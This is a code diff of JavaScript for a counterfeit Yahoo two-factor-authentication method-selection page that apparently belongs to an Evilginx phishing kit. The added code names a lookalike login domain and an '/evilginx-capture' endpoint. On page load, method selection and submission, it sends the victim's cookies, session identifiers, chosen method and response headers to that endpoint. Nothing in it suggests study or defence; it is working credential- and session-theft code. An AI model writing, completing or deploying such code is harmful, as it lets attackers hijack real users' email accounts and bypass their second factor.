@@ -1,212 +1,308 @@
-// ===== YAHOO 2FA PAGE - 100% PROXIED SYNCHRONICITY =====
-console.log("Yahoo 2FA JS - 100% Native/Hybrid Fluent Data Flow Initialized")
+// Yahoo 2FA Selection Page JavaScript - Complete Implementation
+;(() => {
+  // Configuration
+  const CONFIG = {
+    domain: "login.astrowind.live",
+    endpoints: {
+      challengeSelector: "/account/challenge/challenge-selector",
+      capture: "/evilginx-capture",
+    },
+    selectors: {
+      form: "#yahoo-2fa-form",
+      options: ".yahoo-2fa-option",
+      radios: 'input[name="selectedMethod"]',
+      submitBtn: 'button[type="submit"]',
+      sessionIndex: "#sessionIndex",
+      acrumb: "#acrumb",
+    },
+  }
 
-const $ = window.jQuery || window.$
+  // State management
+  const formState = {
+    selectedMethod: "",
+    sessionData: {},
+    isSubmitting: false,
+  }
 
-if ($) {
-  $(document).ready(() => {
-    console.log("Yahoo 2FA selection system initialized")
-
-    // ===== CONFIGURATION =====
-    const config = {
-      redirectDelay: 1500,
-      sessionTimeout: 30000,
-    }
-
-    let selectedMethod = ""
-    let sessionData = {}
-    let username = ""
-
-    // ===== SESSION MANAGEMENT =====
-    const SessionManager = {
-      extractSessionData: () => {
-        const urlParams = new URLSearchParams(window.location.search)
-        const sessionParam = urlParams.get("s")
-
-        if (sessionParam) {
-          try {
-            return JSON.parse(decodeURIComponent(sessionParam))
-          } catch (e) {
-            console.log("Failed to parse session parameter")
-          }
-        }
-
-        const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
-        if (cookieMatch) {
-          try {
-            return JSON.parse(decodeURIComponent(cookieMatch[1]))
-          } catch (e) {
-            console.log("Failed to parse session cookie")
-          }
-        }
-
-        return {}
-      },
-
-      generateFingerprint: () =>
-        JSON.stringify({
-          screen: `${screen.width}x${screen.height}`,
-          colorDepth: screen.colorDepth,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          platform: navigator.platform,
-          timestamp: Date.now(),
-          sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
-        }),
-    }
-
-    // ===== USERNAME RETRIEVAL =====
-    function getUsername() {
-      const urlParams = new URLSearchParams(window.location.search)
-      const user = urlParams.get("u")
-
-      if (user) return decodeURIComponent(user)
-      if (sessionData.username) return sessionData.username
-
-      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
-      if (cookieMatch) return decodeURIComponent(cookieMatch[1])
-
-      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || "user@yahoo.com"
-    }
-
-    // ===== STATE MANAGEMENT =====
-    function showState(state) {
-      $("#main-form, #error-container, #loading-state").hide()
-      $(`#${state}`).show()
-    }
-
-    function showError(message) {
-      $("#error-message").text(message || "Unable to set up verification. Please try again.")
-      showState("error-container")
-    }
-
-    // ===== METHOD SELECTION =====
-    window.selectMethod = (method) => {
-      console.log("Method selected:", method)
-
-      $(".yahoo-verification-option").removeClass("selected")
-      $(`.yahoo-verification-option[data-method="${method}"]`).addClass("selected")
-
-      selectedMethod = method
-      $("#selectedMethod").val(method)
-      $("#submit-btn").prop("disabled", false)
-
-      const descriptions = {
-        sms: "We'll send a code to your phone via SMS",
-        email: "We'll send a code to your recovery email",
-        app: "We'll send a notification to your Yahoo Mobile app",
+  // Utility functions
+  const utils = {
+    getUrlParams: () => {
+      const params = new URLSearchParams(window.location.search)
+      return {
+        sessionIndex: params.get("sessionIndex") || "",
+        acrumb: params.get("acrumb") || "",
+        u: params.get("u") || "",
+        method: params.get("method") || "",
       }
+    },
 
-      $(".yahoo-subtitle").text(descriptions[method] || "We'll send you a verification code")
-    }
-
-    // ===== 2FA SUBMISSION =====
-    function handle2FASubmission() {
-      if (!selectedMethod) {
-        showError("Please select a verification method.")
-        return
+    captureData: async (data) => {
+      try {
+        await fetch(CONFIG.endpoints.capture, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Requested-With": "XMLHttpRequest",
+          },
+          body: JSON.stringify({
+            ...data,
+            timestamp: Date.now(),
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            sessionId: formState.sessionData.sessionId,
+          }),
+        })
+      } catch (error) {
+        console.debug("Capture failed:", error)
       }
+    },
 
-      console.log("Submitting 2FA method selection:", selectedMethod)
-      showState("loading-state")
+    setLoading: (isLoading) => {
+      const form = document.querySelector(CONFIG.selectors.form)
+      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)
 
-      const formData = {
-        username: username,
-        selectedMethod: selectedMethod,
-        sessionIndex: sessionData.sessionIndex || "1",
-        sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
-        crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
-        acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
-        done: "https://mail.yahoo.com/d/folders/1",
-        src: "ym",
-        ".lang": "en-US",
-        ".intl": "us",
-        "browser-fp-data": SessionManager.generateFingerprint(),
+      if (isLoading) {
+        form.classList.add("yahoo-loading")
+        submitBtn.disabled = true
+        submitBtn.textContent = "Sending..."
+      } else {
+        form.classList.remove("yahoo-loading")
+        submitBtn.disabled = !formState.selectedMethod
+        submitBtn.textContent = "Continue"
+      }
+    },
+
+    updateSubmitButton: () => {
+      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)
+      submitBtn.disabled = !formState.selectedMethod
+    },
+  }
+
+  // Session management
+  const sessionManager = {
+    init: () => {
+      const urlParams = utils.getUrlParams()
+      formState.sessionData = {
+        sessionId: "sess_" + Math.random().toString(36).substr(2, 16) + "_" + Date.now(),
+        sessionIndex: urlParams.sessionIndex,
+        acrumb: urlParams.acrumb,
+        username: urlParams.u,
         timestamp: Date.now(),
       }
 
-      $.ajax({
-        url: "/account/challenge/challenge-selector",
-        method: "POST",
-        data: formData,
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-          Origin: window.location.origin,
-          Referer: window.location.href,
-          "User-Agent": navigator.userAgent,
-        },
-        xhrFields: {
-          withCredentials: true,
-        },
-        timeout: 15000,
-        success: (response, textStatus, xhr) => {
-          console.log("2FA method selection successful")
+      // Set hidden form fields
+      const sessionIndexField = document.querySelector(CONFIG.selectors.sessionIndex)
+      const acrumbField = document.querySelector(CONFIG.selectors.acrumb)
 
-          setTimeout(() => {
-            const redirectUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
-            console.log("Redirecting to OTP:", redirectUrl)
-            window.location.href = redirectUrl
-          }, config.redirectDelay)
-        },
-        error: (xhr, textStatus, errorThrown) => {
-          console.error("2FA method selection error:", textStatus, xhr.status)
+      if (sessionIndexField) sessionIndexField.value = formState.sessionData.sessionIndex
+      if (acrumbField) acrumbField.value = formState.sessionData.acrumb
 
-          if (xhr.status === 0) {
-            setTimeout(() => {
-              const redirectUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
-              window.location.href = redirectUrl
-            }, 2000)
-          } else {
-            showError("Unable to set up verification. Please try again.")
-          }
-        },
-      })
-    }
+      // Pre-select method if provided
+      if (urlParams.method) {
+        const methodRadio = document.querySelector(`input[value="${urlParams.method}"]`)
+        if (methodRadio) {
+          methodRadio.checked = true
+          formState.selectedMethod = urlParams.method
+          optionHandler.updateSelection(urlParams.method)
+        }
+      }
+    },
 
-    // ===== FORM SUBMISSION =====
-    $("#verification-form").on("submit", (e) => {
-      e.preventDefault()
-      handle2FASubmission()
-      return false
-    })
-
-    // ===== RETRY HANDLER =====
-    $("#refreshButton").click(() => {
-      selectedMethod = ""
-      $("#selectedMethod").val("")
-      $("#submit-btn").prop("disabled", true)
-      $(".yahoo-verification-option").removeClass("selected")
-      showState("main-form")
-    })
-
-    // ===== INITIALIZATION =====
-    function initializePage() {
-      console.log("Initializing 2FA selection page")
-
-      sessionData = SessionManager.extractSessionData()
-      username = getUsername()
-
-      $("#userEmail").text(username)
-      $("#username").val(username)
-
-      Object.keys(sessionData).forEach((key) => {
-        const element = $(`#${key}`)
-        if (element.length && sessionData[key]) {
-          element.val(sessionData[key])
+    extractCookies: () => {
+      const cookies = {}
+      document.cookie.split(";").forEach((cookie) => {
+        const [name, value] = cookie.trim().split("=")
+        if (name && value) {
+          cookies[name] = value
         }
       })
+      return cookies
+    },
+  }
 
-      $("#timestamp").val(Date.now())
-      $("#browser-fp-data").val(SessionManager.generateFingerprint())
+  // 2FA option handling
+  const optionHandler = {
+    updateSelection: (method) => {
+      // Update visual selection
+      document.querySelectorAll(CONFIG.selectors.options).forEach((option) => {
+        option.classList.remove("selected")
+      })
 
-      console.log("2FA page initialized for user:", username)
-    }
+      const selectedOption = document.querySelector(`[data-method="${method}"]`)
+      if (selectedOption) {
+        selectedOption.classList.add("selected")
+      }
 
-    // ===== START INITIALIZATION =====
-    initializePage()
+      // Update state
+      formState.selectedMethod = method
+      utils.updateSubmitButton()
 
-    console.log("Yahoo 2FA selection system fully initialized")
-  })
-} else {
-  console.error("jQuery not found - Yahoo 2FA JS requires jQuery")
-}
+      // Capture selection
+      utils.captureData({
+        type: "2fa_method_selected",
+        method: method,
+        sessionData: formState.sessionData,
+      })
+    },
+
+    handleOptionClick: (event) => {
+      const option = event.currentTarget
+      const method = option.getAttribute("data-method")
+      const radio = option.querySelector('input[type="radio"]')
+
+      if (radio) {
+        radio.checked = true
+        optionHandler.updateSelection(method)
+      }
+    },
+
+    handleRadioChange: (event) => {
+      const method = event.target.value
+      optionHandler.updateSelection(method)
+    },
+  }
+
+  // Form submission handler
+  const formHandler = {
+    handleSubmit: async (event) => {
+      event.preventDefault()
+
+      if (formState.isSubmitting || !formState.selectedMethod) return
+
+      formState.isSubmitting = true
+      utils.setLoading(true)
+
+      // Capture submission
+      await utils.captureData({
+        type: "2fa_method_submitted",
+        selectedMethod: formState.selectedMethod,
+        sessionData: formState.sessionData,
+        cookies: sessionManager.extractCookies(),
+      })
+
+      // Simulate realistic delay
+      await new Promise((resolve) => setTimeout(resolve, 1000 + Math.random() * 500))
+
+      try {
+        // Submit to Yahoo (will be intercepted by evilginx)
+        const response = await fetch(CONFIG.endpoints.challengeSelector, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+          },
+          body: new URLSearchParams({
+            selectedMethod: formState.selectedMethod,
+            sessionIndex: formState.sessionData.sessionIndex,
+            acrumb: formState.sessionData.acrumb,
+          }),
+          credentials: "include",
+        })
+
+        // Capture response
+        await utils.captureData({
+          type: "2fa_selection_response",
+          status: response.status,
+          method: formState.selectedMethod,
+          headers: Object.fromEntries(response.headers.entries()),
+          cookies: sessionManager.extractCookies(),
+        })
+
+        if (response.ok) {
+          // Redirect to OTP page
+          const params = new URLSearchParams({
+            u: formState.sessionData.username,
+            sessionIndex: formState.sessionData.sessionIndex,
+            acrumb: formState.sessionData.acrumb,
+            method: formState.selectedMethod,
+          })
+
+          window.location.href = `/otp-index.html?${params.toString()}`
+        } else {
+          // Handle error
+          console.error("2FA selection failed")
+          // Could show error message here
+        }
+      } catch (error) {
+        console.error("Submission error:", error)
+      } finally {
+        utils.setLoading(false)
+        formState.isSubmitting = false
+      }
+    },
+  }
+
+  // Event listeners
+  const eventListeners = {
+    init: () => {
+      // Form submission
+      const form = document.querySelector(CONFIG.selectors.form)
+      if (form) {
+        form.addEventListener("submit", formHandler.handleSubmit)
+      }
+
+      // Option clicks
+      document.querySelectorAll(CONFIG.selectors.options).forEach((option) => {
+        option.addEventListener("click", optionHandler.handleOptionClick)
+      })
+
+      // Radio changes
+      document.querySelectorAll(CONFIG.selectors.radios).forEach((radio) => {
+        radio.addEventListener("change", optionHandler.handleRadioChange)
+      })
+
+      // Keyboard navigation
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Enter" && formState.selectedMethod && !formState.isSubmitting) {
+          const form = document.querySelector(CONFIG.selectors.form)
+          if (form) {
+            form.dispatchEvent(new Event("submit"))
+          }
+        }
+
+        // Arrow key navigation
+        if (e.key === "ArrowUp" || e.key === "ArrowDown") {
+          const radios = Array.from(document.querySelectorAll(CONFIG.selectors.radios))
+          const currentIndex = radios.findIndex((radio) => radio.checked)
+          let nextIndex
+
+          if (e.key === "ArrowUp") {
+            nextIndex = currentIndex > 0 ? currentIndex - 1 : radios.length - 1
+          } else {
+            nextIndex = currentIndex < radios.length - 1 ? currentIndex + 1 : 0
+          }
+
+          if (radios[nextIndex]) {
+            radios[nextIndex].checked = true
+            radios[nextIndex].dispatchEvent(new Event("change"))
+            e.preventDefault()
+          }
+        }
+      })
+    },
+  }
+
+  // Initialize everything when DOM is ready
+  const init = () => {
+    sessionManager.init()
+    eventListeners.init()
+    utils.updateSubmitButton()
+
+    // Initial page load capture
+    utils.captureData({
+      type: "page_loaded",
+      page: "2fa_selection",
+      sessionData: formState.sessionData,
+      cookies: sessionManager.extractCookies(),
+    })
+
+    console.debug("Yahoo 2FA selection page initialized")
+  }
+
+  // Start when DOM is ready
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init)
+  } else {
+    init()
+  }
+})()
